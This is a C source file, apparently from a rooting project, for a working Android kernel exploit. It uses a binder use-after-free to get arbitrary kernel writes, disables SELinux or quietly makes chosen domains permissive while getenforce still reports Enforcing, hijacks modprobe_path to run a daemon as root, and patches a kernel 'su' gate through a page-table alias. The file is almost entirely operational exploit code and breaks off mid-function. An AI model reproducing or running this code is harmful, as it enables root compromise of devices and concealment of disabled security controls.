#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/uio.h>
#include <sched.h>
#include "ebitmap_map.h"

/* Port of su98.c's clobber_data() (Alexander R. Pruss, LG V20 = msm8996 3.18.71-perf)
 * onto OUR measured constants, with the PoC's own self-test kept as the gate.
 *
 * Mechanism (this is what I previously mis-closed): the poisoned entry's iov_len is a
 * kernel pointer, so readv BLOCKS inside that one segment.  The 48-byte chunk the child
 * feeds is copied into the array's OWN following descriptor slots -- entries that the
 * iterator has not reached yet -- so those entries are reprogrammed in flight:
 * {payloadAddress, payloadLength} then {&testDatum, 8}.  When the iterator walks on it
 * honours the NEW descriptors and copies the payload to payloadAddress with no
 * access_ok re-check (the only check ran at import time, on the pre-poison values).
 *
 * V20 build: sizeof(binder_thread)=0x190, wait.task_list at +0xA0 (entry 10, lock at +0x98)
 * OUR build: sizeof(binder_thread)=0x128, wait.task_list at +0x50 (entry 5, lock at +0x48)
 */
#define PAGE           0x1000ul
#define UAF_SPINLOCK   0x10001
#define BINDER_THREAD_SZ 0x128
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)      /* 18 */
#define WQIDX          (0x50 / 16)                  /* entry holding task_list.next/prev */
#define LOCKIDX        (WQIDX - 1)                  /* its iov_len IS wait.lock (+0x48)    */
#define DELAY_USEC     200000
#define BINDER_THREAD_EXIT 0x40046208u
#define BINDER_SET_MAX_THREADS _IOW('c', 5, uint32_t)

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size, write_consumed, write_buffer;
    binder_size_t read_size, read_consumed, read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

static int binder_fd = -1, epfd = -1;
static struct epoll_event g_ev = { .events = EPOLLIN };

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* the only state where binder_poll() registers poll_wait(&thread->wait):
 * transaction_stack set, todo empty, return_error BR_OK, and BR_TRANSACTION_COMPLETE
 * drained WITHOUT also eating the BR_REPLY. */
static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc, attempt_no;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;                         /* check_service, synchronous */
    tr.flags = 0;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (uint64_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm: rc=%d errno=%d\n", rc, errno); return rc; }

    for (attempt_no = 0; attempt_no < 3; attempt_no++) {
        char rbuf[256];
        struct binder_write_read bwr2;
        size_t off = 0;
        int got_complete = 0, got_reply = 0;
        memset(rbuf, 0, sizeof rbuf);
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (uint64_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        if (rc)
            return rc;
        while (off + 4 <= (size_t)bwr2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206)
                got_complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { got_reply = 1; off += 64; }
        }
        if (got_complete && !got_reply)
            return 0;
        if (got_reply) {
            printf("  drain %d: reply already eaten (round unusable)\n", attempt_no);
            return -1;
        }
        printf("  drain %d: rc=%d rconsumed=%llu complete=%d reply=%d\n",
               attempt_no, rc, (unsigned long long)bwr2.read_consumed,
               got_complete, got_reply);
    }
    return -1;
}

static int iovec_size(struct iovec *iov, int n)
{
    int i, s = 0;
    for (i = 0; i < n; i++)
        s += iov[i].iov_len;
    return s;
}

static unsigned long testDatum;
static const unsigned long testValue = 0xABCDDEADBEEF1234ul;

/* returns 1 on success (testDatum == testValue), 0 on a clean miss, -1 on setup failure */
static int WQI = 4;   /* padding entry = WQI-1, lock = WQI's len, pair = WQI+1 (see layout note) */
static int SAFEFED = 1;  /* 1 = feed only chunk+payload+marker (<=64B), 0 = su98's full feed */
static int clobber_data(unsigned long payloadAddress, const void *src,
                        unsigned long payloadLength, int verbose)
{
    int dummyBufferSize = (int)(UAF_SPINLOCK > PAGE ? UAF_SPINLOCK : PAGE);
    char *dummyBuffer = malloc(dummyBufferSize);
    struct iovec iovec_array[IOVEC_ARRAY_SZ];
    unsigned long second_write_chunk[3 * 2];
    int pipes[2], b, totalLength, rc = 0;
    int delta, paddingSize, pid, status;

    if (dummyBuffer == NULL)
        return -1;
    memset(dummyBuffer, 0, dummyBufferSize);
    memset(iovec_array, 0, sizeof iovec_array);
    testDatum = 0;

    second_write_chunk[0] = (unsigned long)dummyBuffer;
    second_write_chunk[1] = 3 * 0x10;
    second_write_chunk[2] = payloadAddress;
    second_write_chunk[3] = payloadLength;
    second_write_chunk[4] = (unsigned long)&testDatum;
    second_write_chunk[5] = sizeof(testDatum);

    delta = (int)((UAF_SPINLOCK + sizeof(second_write_chunk)) % PAGE);
    paddingSize = delta == 0 ? 0 : PAGE - delta;

    memset(iovec_array, 0, sizeof iovec_array);
    /* su98's shape, index-shifted for OUR measured layout:
       [WQI-1] padding, [WQI].iov_len = wait.lock (becomes 0x10001),
       [WQI+1] = the task_list pair the kernel overwrites, then the descriptors
       the 48-byte chunk reprograms in flight. */
    iovec_array[WQI - 1].iov_base = dummyBuffer;
    iovec_array[WQI - 1].iov_len = SAFEFED ? 0 : paddingSize;
    iovec_array[WQI].iov_base = dummyBuffer;
    iovec_array[WQI].iov_len = 0;
    iovec_array[WQI + 1].iov_base = second_write_chunk;
    iovec_array[WQI + 1].iov_len = sizeof(second_write_chunk);
    iovec_array[WQI + 2].iov_base = dummyBuffer;
    iovec_array[WQI + 2].iov_len = UAF_SPINLOCK;
    iovec_array[WQI + 3].iov_base = dummyBuffer;
    iovec_array[WQI + 3].iov_len = payloadLength;
    iovec_array[WQI + 4].iov_base = dummyBuffer;
    iovec_array[WQI + 4].iov_len = sizeof(testDatum);
    totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);

    if (pipe(pipes)) { free(dummyBuffer); return -1; }
    if (fcntl(pipes[0], F_SETPIPE_SZ, PAGE) != (int)PAGE ||
        fcntl(pipes[1], F_SETPIPE_SZ, PAGE) != (int)PAGE) {
        printf("  pipe size to one page failed errno=%d\n", errno);
        close(pipes[0]); close(pipes[1]); free(dummyBuffer);
        return -1;
    }

    pid = fork();
    if (pid < 0) { close(pipes[0]); close(pipes[1]); free(dummyBuffer); return -1; }
    if (pid == 0) {
        char *f = malloc(totalLength);
        unsigned long pos = 0;
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(pipes[0]);                       /* child only writes */
        usleep(DELAY_USEC);
        if (epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &g_ev))
            printf("  child: epoll_del failed errno=%d\n", errno);
        if (f == NULL)
            _exit(3);
        if (SAFEFED) {
            /* The byte offset this branch would write at has never been measured -- every verified
             * run on this device passes SAFEFED=0.  Refuse rather than guess. */
            printf("  child: SAFEFED=1 offset unmeasured, refusing\n");
            _exit(4);
        }
        memset(f, 0, paddingSize + UAF_SPINLOCK);
        pos = paddingSize + UAF_SPINLOCK;
        memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
        pos += sizeof(second_write_chunk);
        memcpy(f + pos, src, payloadLength);
        pos += payloadLength;
        memcpy(f + pos, &testValue, sizeof(testDatum));
        pos += sizeof(testDatum);
        {
            ssize_t w = write(pipes[1], f, pos);
            if (w != (ssize_t)pos)
                printf("  child: write returned %zd of %lu errno=%d\n", w, pos, errno);
        }
        if (verbose)
            printf("  child: wrote %lu bytes\n", pos);
        free(f);
        close(pipes[1]);
        _exit(0);
    }
    close(pipes[1]);

    errno = 0;
    b = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    if (b)
        printf("  BINDER_THREAD_EXIT rc=%d errno=%d\n", b, errno);
    errno = 0;
    alarm(10);
    b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);
    alarm(0);
    if (verbose)
        printf("  readv = %d (expected %d) errno=%d\n", b, totalLength, errno);
    waitpid(pid, &status, 0);
    close(pipes[0]);

    if (testDatum == testValue)
        rc = 1;
    else if (verbose)
        printf("  miss: testDatum=%#lx want %#lx\n", testDatum, testValue);
    free(dummyBuffer);
    return rc;
}

static void onalrm(int s){ (void)s; printf("  readv HUNG (killed by alarm)\n"); _exit(9); }

/* The proven driver, factored out so the adb CLI and the APK's JNI entry run
 * byte-for-byte the same path (that path is what run_temproot.sh validated on
 * this device three times from cold boot).  Returns 1 hit, 0 no hit, -1 setup
 * failure (binder open denied -> the caller must not retry). */
static int run_rounds(unsigned long addr, const void *buf, size_t blen, int rounds, int verbose)
{
    int r, max_threads = 3, ok = 0;
    void *map;

    pin0();
    for (r = 0; r < rounds; r++) {
        binder_fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
        if (binder_fd < 0) {
            printf("open binder errno=%d\n", errno);
            return -1;
        }
        map = mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, binder_fd, 0);
        if (map == MAP_FAILED)
            printf("  mmap binder: %s\n", strerror(errno));
        ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
        epfd = epoll_create(1000);
        if (arm_pending_tx(binder_fd) != 0) {
            printf("--- round %d: arm failed\n", r);
            close(binder_fd);
            close(epfd);
            continue;
        }
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &g_ev))
            printf("  epoll_add errno=%d\n", errno);
        if (verbose)
            printf("--- round %d ---\n", r);
        if (clobber_data(addr, buf, blen, verbose) == 1) {
            printf("  *** CLOBBER OK ***\n");
            ok = 1;
            close(epfd);
            close(binder_fd);
            break;
        }
        close(epfd);
        close(binder_fd);
    }
    return ok;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 8;
    struct sigaction sa;
    memset(&sa, 0, sizeof sa); sa.sa_handler = onalrm; sigaction(SIGALRM, &sa, NULL);
    if (argc > 2 && argv[2][0] >= '0' && argv[2][0] <= '9') { WQI = atoi(argv[2]); }
    int mode_selftest = 1;
    unsigned long addr = 0;
    unsigned char buf[64];
    size_t blen = 0;
    int ok;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc > 4 && !strcmp(argv[2], "kern")) {
        const char *pl;
        mode_selftest = 0;
        addr = strtoul(argv[3], 0, 0);
        pl = argv[4];
        if (!strncmp(pl, "str:", 4)) {
            pl += 4;
            blen = strlen(pl);
            if (blen + 1 > sizeof buf)
                blen = sizeof buf - 1;
            memcpy(buf, pl, blen);
            /* NUL up to the whole buffer.  modprobe_path[] keeps whatever was
             * there before, so writing a SHORTER path without clearing the tail
             * yields "<new><old-rest>" -- an ENOENT path the kernel fails
             * silently.  Measured on-device: str:/data/local/tmp/sudA over the
             * app path read back as "/data/local/tmp/sudAay6.temproot/files/sud". */
            buf[blen++] = 0;
            while (blen < sizeof buf)
                buf[blen++] = 0;
        } else if (!strncmp(pl, "hex:", 4)) {
            pl += 4;
            while (pl[0] && pl[1] && blen < sizeof buf) {
                char pair[3] = { pl[0], pl[1], 0 };
                buf[blen++] = (unsigned char)strtoul(pair, 0, 16);
                pl += 2;
            }
        } else {
            printf("payload must be str:<text> or hex:<hhhh..>\n");
            return 1;
        }
    }
    if (!mode_selftest && argc > 5) {
        WQI = atoi(argv[5]);
        if (argc > 6) SAFEFED = atoi(argv[6]);
    } else if (argc > 3) {
        SAFEFED = atoi(argv[3]);
    }
    /* The layout touches [WQI-1] .. [WQI+4]; a bad WQI (I got 0 from a hex payload
     * that accidentally contained a space, so argv[5] parsed as the index) makes the
     * kernel walk off the iovec array and panic -- measured: that rebooted the phone.
     * Refuse instead of crashing the box. */
    if (!mode_selftest && (WQI < 1 || WQI + 4 >= IOVEC_ARRAY_SZ)) {
        printf("bad WQI=%d: must be in [1, %d]\n", WQI, IOVEC_ARRAY_SZ - 5);
        return 1;
    }
    printf("mode=%s addr=%#lx len=%zu  (WQI=%d array_sz=%d SAFEFED=%d)\n",
           mode_selftest ? "SELFTEST(user target)" : "KERN", addr, blen, WQI, IOVEC_ARRAY_SZ, SAFEFED);
    if (mode_selftest) {
        addr = (unsigned long)&testDatum;
        *(unsigned long *)buf = 0;
        blen = 8;
    }
    if (blen == 0) { printf("nothing to write\n"); return 1; }

    ok = run_rounds(addr, buf, blen, rounds, 1);
    printf("RESULT: %s\n", ok == 1 ? "PRIMITIVE WORKS" : "no hit in this batch");
    return ok == 1 ? 0 : 1;
}

#ifdef ESC_LIB
/* --------------------------------------------------------------------------
 * Library entry (compiled into libesc.so for the APK).  Deliberately the same
 * clobber_data / WQI=4 / trigger shape that run_temproot.sh proved on-device:
 * a second implementation of the chain would make the adb-verified result say
 * nothing about what the app runs.
 *
 * Return codes: 0 ok, negative names the step that failed.
 *   -10/-11 step1 write failed / not applied   -20/-21 step2 write / readback
 *   -30 trigger could not be written           -31 trigger execve did not run
 * ------------------------------------------------------------------------ */
#include <stdarg.h>

/* No KASLR on this build, and both targets are the same addresses every boot
 * (three cold-boot runs).  Values must stay in step with tools/run_temproot.sh. */
#define ENFORCE_ADDR   0xffffffc00189be74UL
#define MODPROBE_ADDR  0xffffffc001635a30UL
#define BADMAGIC       "AAAAAAAA\n"

/* policydb.permissive_map -- measured as policydb(0xffffffc00189f320)+0x1b0 out of this device's own
 * security_compute_av disassembly, not computed by hand.  Setting a bit here makes that TYPE
 * permissive while selinux_enforcing stays 1, so `getenforce` keeps answering Enforcing.
 * The nodes themselves live in the tail of modprobe_path[] (char[256] at MODPROBE_ADDR): the path
 * we write occupies the first 64 bytes, so bytes +72..+136 are ours to reuse.
 * Byte layout comes from ebitmap_map.h -- the SAME header tools/mapcheck.c compiles on the host to
 * prove these bytes equal the payloads bootstrap3.sh planted on-device (two compilers, two targets,
 * one builder). */
#define PERM_MAP_ADDR     0xffffffc00189f4d0UL
#define MAP_NODE_BASE     (MODPROBE_ADDR + 0x48)

/* Type values from tools/_type_values.txt (tools/policy_types.py, positive control
 * qti_init_shell==241, which is the bit measured to exempt the daemon on-device). */
static const unsigned int esc_exempt[] = { 164, 241, 494, 627 };  /* kernel, qti_init_shell, init, untrusted_app */
#define NEXEMPT ((int)(sizeof esc_exempt / sizeof *esc_exempt))

struct elog {
    char *buf;
    int cap, used;
};

static void el(struct elog *e, const char *fmt, ...)
{
    va_list ap;
    int n, room;

    if (!e || !e->buf || e->used >= e->cap - 1)
        return;
    room = e->cap - e->used;
    va_start(ap, fmt);
    n = vsnprintf(e->buf + e->used, room, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    e->used += n < room - 1 ? n : room - 1;
}

/* /sys/fs/selinux/enforce and /proc/sys/kernel/modprobe are world-readable in
 * DAC terms, but under ENFORCING an app domain is not allowed to read them at
 * all -- so "cannot read" must never be reported as "the write did not land".
 * Both helpers return -1 for unreadable and the callers treat only an explicit
 * contradiction as failure; the authoritative proof is the daemon's own answer. */
static int enforce_now(void)
{
    char c;
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0)
        return -1;
    if (read(fd, &c, 1) != 1) {
        close(fd);
        return -1;
    }
    close(fd);
    return c == '0' ? 0 : 1;
}

static int modprobe_is(const char *want)
{
    char got[256];
    ssize_t n;
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
        return -1;
    n = read(fd, got, sizeof got - 1);
    close(fd);
    if (n <= 0)
        return -1;
    got[n] = 0;
    while (n > 0 && (got[n - 1] == '\n' || got[n - 1] == '\r'))
        got[--n] = 0;
    return strcmp(got, want) == 0;
}

/* Did the helper come up?  Ask it directly: its su port is bound a moment after
 * the kernel execs it, and a TCP connect is something an app may do once we are
 * permissive (step1 already made us so). */
static int daemon_up(void)
{
    struct sockaddr_in a;
    int fd = socket(AF_INET, SOCK_STREAM, 0), rc;

    if (fd < 0)
        return 0;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_port = htons(12346);
    a.sin_addr.s_addr = htonl(0x7f000001);
    rc = connect(fd, (struct sockaddr *) &a, sizeof a);
    close(fd);
    return rc == 0;
}

/* the user-memory positive control: proves the whole chain (binder UAF, poisoned
 * iovec, pipe-fed descriptor rewrite) inside this process/domain without a
 * single kernel byte touched.  Must pass before any kern target is attempted.
 *
 * SAFEFED/WQI are set explicitly here rather than inherited: the file-scope
 * default SAFEFED=1 is the *dead* feed mode (readv returns 0, nothing is
 * rewritten), and the on-device recipe that works is WQI=4 with SAFEFED=0 --
 * i.e. su98's full padding+0x10001 feed. */
int esc_probe(char *out, int cap)
{
    struct elog e = { out, cap, 0 };
    unsigned char zero[8] = { 0 };
    int rc;

    WQI = 4;
    SAFEFED = 0;
    /* 24 rounds, not 8: the selftest shares the same freed-slot race as the real
     * write, and at boot 8 rounds was often a clean miss (measured) which made the
     * diagnostic read as "the primitive is broken" while the kernel write hit. */
    rc = run_rounds((unsigned long)&testDatum, zero, 8, 24, 0);
    el(&e, "selftest(WQI=4 SAFEFED=0) rc=%d", rc);
    return rc == 1 ? 0 : -1;
}

int esc_state(char *out, int cap)
{
    struct elog e = { out, cap, 0 };
    int en = enforce_now();
    char mp[256];
    ssize_t n;
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);

    n = fd >= 0 ? read(fd, mp, sizeof mp - 1) : -1;
    if (fd >= 0)
        close(fd);
    if (n > 0)
        mp[n] = 0;
    else
        mp[0] = 0;
    el(&e, "uid=%d enforce=%s modprobe=%s", getuid(),
       en == 0 ? "Permissive" : en == 1 ? "Enforcing" : "unreadable", mp);
    return 0;
}

int esc_escalate_ex(const char *daemon, int rounds, char *out, int cap, int map_only);

/* Compatibility wrapper: every existing caller (adb path, JNI) keeps the global "enforce=0" shape. */
int esc_escalate(const char *daemon, int rounds, char *out, int cap)
{
    return esc_escalate_ex(daemon, rounds, out, cap, 0);
}

/* Write the exemption bitmap: one batch PER NODE (measured: a single 128-byte batch reported
 * PRIMITIVE WORKS while only its first 64 bytes landed, and the domains living in the second node
 * kept being denied -- ledger S137), then the 16-byte ebitmap head. */
static int esc_plant_map(struct elog *e, int rounds)
{
    unsigned char nodes[EBMP_MAX_NODES * EBMP_NODE_BYTES], head[16];
    int nw, w, rc;
    /* Boot is the worst case for this race: measured, the node write missed 3 consecutive batches of
     * `rounds` (=12) at boot while the enforce=0 write of the same chain hit on its first batch
     * minutes later.  esc_probe already uses 24 rounds for the same reason; the map must not be the
     * weaker step of the two, because a missed map write means "stay confined" (rc=-2 -> caller falls
     * back), which is safe but loses the Enforcing-coexistence property. */
    int r = rounds < 24 ? 24 : rounds;

    nw = ebmp_build(esc_exempt, NEXEMPT, (unsigned long long)MAP_NODE_BASE, nodes, head);
    if (nw < 0) {
        el(e, "map: %d bits need more than %d nodes", NEXEMPT, EBMP_MAX_NODES);
        return -1;
    }
    for (w = 0; w < nw; w++) {
        rc = run_rounds(MAP_NODE_BASE + EBMP_NODE_BYTES * w, nodes + EBMP_NODE_BYTES * w,
                        EBMP_NODE_BYTES, r, 0);
        el(e, "map node%d addr=%#lx rounds=%d rc=%d", w,
           (unsigned long)(MAP_NODE_BASE + EBMP_NODE_BYTES * (unsigned long)w), r, rc);
        if (rc != 1)
            return -2;
    }
    /* Dump the raw bytes (nodes then head) so the same run leaves a witness that can be diffed
     * against tools/bootstrap3.sh's python payloads and against tools/mapcheck on the host. */
    {
        int fd = open("/data/local/tmp/esc.map", O_WRONLY | O_CREAT | O_TRUNC, 0644);

        if (fd >= 0) {
            if (write(fd, nodes, EBMP_NODE_BYTES * (size_t)nw) != (ssize_t)(EBMP_NODE_BYTES * nw))
                el(e, "map dump nodes short");
            if (write(fd, head, sizeof head) != (ssize_t) sizeof head)
                el(e, "map dump head short");
            close(fd);
        } else
            el(e, "map dump open: errno=%d", errno);
    }
    rc = run_rounds(PERM_MAP_ADDR, head, sizeof head, r, 0);
    el(e, "map head addr=%#lx nodes=%d rc=%d", (unsigned long)PERM_MAP_ADDR, nw, rc);
    return rc == 1 ? 0 : -3;
}

int esc_escalate_ex(const char *daemon, int rounds, char *out, int cap, int map_only)
{
    struct elog e = { out, cap, 0 };
    static unsigned char payload[128];
    static unsigned char zero4[4];
    unsigned char *dp;
    char trig[256];
    size_t dlen;
    int rc, r, fd, status, wpid;
    pid_t pid;

    if (rounds <= 0)
        rounds = 24;
    /* Floor of 24 batches for EVERY kernel write, not just the map.  Measured over three cold boots:
     * two boots rooted, one boot lost every batch of both routes ("step1 write
     * selinux_enforcing=0 rc=0" x4 -> NOT ROOTED), and the app's log says the process did start --
     * so the intermittency is the allocator race at boot, not the entrance.  esc_probe already used
     * 24 for the same reason. */
    if (rounds < 24)
        rounds = 24;
    WQI = 4;
    SAFEFED = 0;
    /* Canonicalize.  Measured on-device: with modprobe_path =
     * "/data/user/0/com.xplay6.temproot/files/sud" the kernel helper execs
     * NOTHING (no stage log, no process, no error), while the very same binary
     * addressed as "/data/data/com.xplay6.temproot/files/sud" runs as uid 0.
     * /data/user/0 is a symlink to /data/data, and the helper path is not
     * resolved through it -- so hand the kernel the spelling it accepts. */
    {
        static char rbuf[256];
        if (daemon != NULL && realpath(daemon, rbuf) != NULL)
            daemon = rbuf;
    }
    dlen = daemon ? strlen(daemon) : 0;
    if (!daemon || dlen == 0 || dlen + 1 > sizeof payload) {
        el(&e, "bad daemon path (len=%zu, max %zu)", dlen + 1, sizeof payload);
        return -1;
    }
    snprintf(trig, sizeof trig, "%s.trig", daemon);

    /* 1. clear the MAC hurdle the daemon exec would otherwise be judged by: either globally
     *    (write selinux_enforcing=0) or per-domain (plant policydb.permissive_map, map_only).
     *    appdomain has no such allows, so this must come before anything that needs them. */
    dp = malloc(dlen + 1);
    if (dp == NULL)
        return -1;
    memcpy(dp, daemon, dlen + 1);

    if (map_only) {
        /* Do not touch selinux_enforcing at all: only the listed types become permissive, so
         * `getenforce` still says Enforcing and every other domain stays confined (measured:
         * an unexempted adb shell is still refused on a fresh label). */
        rc = esc_plant_map(&e, rounds);
        el(&e, "step1 map rc=%d enforce=%d", rc, enforce_now());
        if (rc != 0)
            return -12;
    } else if (enforce_now() == 0) {
        el(&e, "step1 skip: enforce already 0");
    } else {
        rc = run_rounds(ENFORCE_ADDR, zero4, 4, rounds, 0);
        el(&e, "step1 write selinux_enforcing=0 rc=%d", rc);
        if (rc != 1)
            return -10;
        if (enforce_now() == 1) {
            el(&e, "step1 NOT APPLIED (enforce still reads 1)");
            return -11;
        }
        el(&e, "step1 ok (enforce reads %d)", enforce_now());
    }

    /* 2. point the module loader at the daemon */
    if (modprobe_is((const char *)dp) == 1) {
        el(&e, "step2 skip: modprobe_path already set");
    } else {
        /* Always write a fixed 64 bytes: string + NUL tail.  modprobe_path[] is
         * char[256] (next symbol measured at +256) and it keeps its previous
         * contents, so a shorter unpadded path would splice onto the old tail
         * and the kernel would silently exec a path that does not exist. */
        memset(payload, 0, sizeof payload);
        memcpy(payload, dp, dlen + 1);
        rc = run_rounds(MODPROBE_ADDR, payload, 64, rounds, 0);
        el(&e, "step2 write modprobe_path rc=%d (64B, padded)", rc);
        if (rc != 1)
            return -20;
        if (modprobe_is((const char *)dp) == 0) {
            el(&e, "step2 NOT APPLIED on readback");
            return -21;
        }
        el(&e, "step2 ok (readback %d: 1=ours 0=wrong -1=unreadable under enforcing)",
           modprobe_is((const char *)dp));
    }

    /* 3. make the kernel run modprobe_path, by two carriers tried in order.
     *
     *    (a) FILE-LESS: socket(AF_INET, <type>, <unregistered proto>) sends
     *        inet_create() into request_module("net-pf-2-proto-P-type-T"), which
     *        execs modprobe_path.  The syscall then fails with EPROTONOSUPPORT,
     *        and *that* failure is the evidence the helper was asked for.  No
     *        executable file is involved, which matters: the bad-magic execve
     *        below was measured to bring the helper up from the shell domain but
     *        not from an app process.
     *
     *    (b) the classic bad-magic execve -- the path proven from adb/shell.
     *
     * Each carrier is followed by a connect() to the daemon's su port, because
     * the helper binds a moment after execve returns.
     */
    {
        static const int PROTOS[5] = { 253, 254, 99, 89, 47 };
        static const int TYPES[2] = { SOCK_DGRAM, SOCK_STREAM };
        int pi, ti;

        for (pi = 0; pi < 5; pi++) {
            for (ti = 0; ti < 2; ti++) {
                int s = socket(AF_INET, TYPES[ti], PROTOS[pi]);
                int en = errno;

                if (s >= 0)
                    close(s);
                el(&e, "sock-trigger proto=%d type=%d rc=%d errno=%d",
                   PROTOS[pi], TYPES[ti], s, en);
                if (daemon_up()) {
                    el(&e, "daemon up after socket trigger");
                    goto triggered;
                }
            }
        }
    }

    fd = open(trig, O_CREAT | O_TRUNC | O_WRONLY, 0755);
    if (fd < 0) {
        el(&e, "step3 open %s: %s", trig, strerror(errno));
        return -30;
    }
    if (write(fd, BADMAGIC, sizeof BADMAGIC) != (ssize_t)sizeof BADMAGIC) {
        el(&e, "step3 short write to %s", trig);
        close(fd);
        return -30;
    }
    close(fd);
    chmod(trig, 0755);
    pid = fork();
    if (pid == 0) {
        char *av[2] = { trig, NULL };
        char *ep[1] = { NULL };
        errno = 0;
        execve(trig, av, ep);
        /* Report errno rather than a fixed 127: "the exec was refused" and "the
         * exec ran and no binfmt claimed the file" both looked like 127, and that
         * ambiguity is what hid this failure for two rounds. */
        _exit(errno > 0 && errno < 128 ? errno : 127);
    } else if (pid < 0) {
        el(&e, "step3 fork: %s", strerror(errno));
        return -31;
    }
    wpid = waitpid(pid, &status, 0);
    el(&e, "step3 execve-trigger waitpid=%d child-exit=%d (8=ENOEXEC helper ran, 13=EACCES, 1=EPERM)",
       wpid, WEXITSTATUS(status));
    for (r = 0; r < 12 && !daemon_up(); r++)
        usleep(250000);

triggered:
    for (r = 0; r < 20 && enforce_now() == 1; r++)
        usleep(250000);
    r = enforce_now();
    el(&e, "done: enforce=%d(0=permissive 1=enforcing -1=unreadable-by-app) modprobe=%s", r,
       modprobe_is((const char *)dp) == 1 ? "ours" : "not-confirmed");
    free(dp);
    return 0;
}

/* ---- the "su" name gate: two RAM writes, no code executed by us --------------------------
 * Same shape tools/run_sugate.sh proved on this device, kept deliberately in step with it:
 *   1) write a 1 GB block descriptor into pgd slot 511 of swapper_pg_dir.  The slot is empty
 *      by construction (RAM spans linear-map slots ~256..262 with memstart 0x40000000), so a
 *      wrong guess costs "this alias does not exist", not a corrupted live entry, and the VA
 *      is brand new so there is no stale TLB to fight.
 *   2) through that window, rewrite the gate's first `b.ne` into an unconditional `b` to its
 *      own "not su" exit, so the name check always returns 0 (allow).  One word, nothing else.
 * Between them the window must be PROVEN, not assumed: "readv reached the end" is not a
 * landing witness (a batch whose redirect never happened consumes the whole feed too -- that
 * is exactly how a wrong physical base looked like success on 2026-10-14).  The proof is
 * semantic and cache-immune: flip selinux_enforcing through the alias and flip it back, and
 * watch /sys/fs/selinux/enforce answer both times.  If an app cannot read that file
 * (enforce_now() == -1) the proof is skipped and the caller must rely on its own
 * execve-of-`su` witness instead -- which is the real acceptance either way.
 *
 * Values must stay in step with tools/pgdalias.py, which re-derives and asserts them
 * (PHYS_OFFSET=0x40000000 measured from /proc/iomem; gate VA from fw/Image at base 0x80000).
 * Return 0 ok; -1 alias entry write missed; -2 alias proof failed (entry left as shipped);
 * -3 patch write missed (word rolled back); -4 rollback itself missed.
 */
#define SUGATE_PAGE_OFFSET 0xffffffc000000000UL
#define SUGATE_ALIAS_BASE  0xffffffffc0000000UL          /* pgd slot 511 */
#define SUGATE_PGD_ENTRY   0xffffffc001b41ff8UL          /* swapper_pg_dir + 511*8 */
#define SUGATE_GATE_VA     0xffffffc0003326b4UL          /* the b.ne at gate() head */
#define SUGATE_GATE_ORIG   0x54000121u                    /* b.ne -> "not su" exit */
#define SUGATE_GATE_PATCH  0x14000009u                    /* b, unconditional */

static void put_le(unsigned char *p, unsigned long long v, int n)
{
    int i;

    for (i = 0; i < n; i++)
        p[i] = (unsigned char)((v >> (8 * i)) & 0xff);
}

static unsigned long sugate_alias(unsigned long va)
{
    return SUGATE_ALIAS_BASE + (va - SUGATE_PAGE_OFFSET);
}

int esc_sugate(char *out, int cap)
{
    struct elog e = { out, cap, 0 };
    unsigned char desc[8], patchw[4], origw[4], opp[4], cur[4];
    unsigned long gate_alias, enf_alias;
    int r = 24, rc, was, want;

    gate_alias = sugate_alias(SUGATE_GATE_VA);
    enf_alias = sugate_alias(ENFORCE_ADDR);
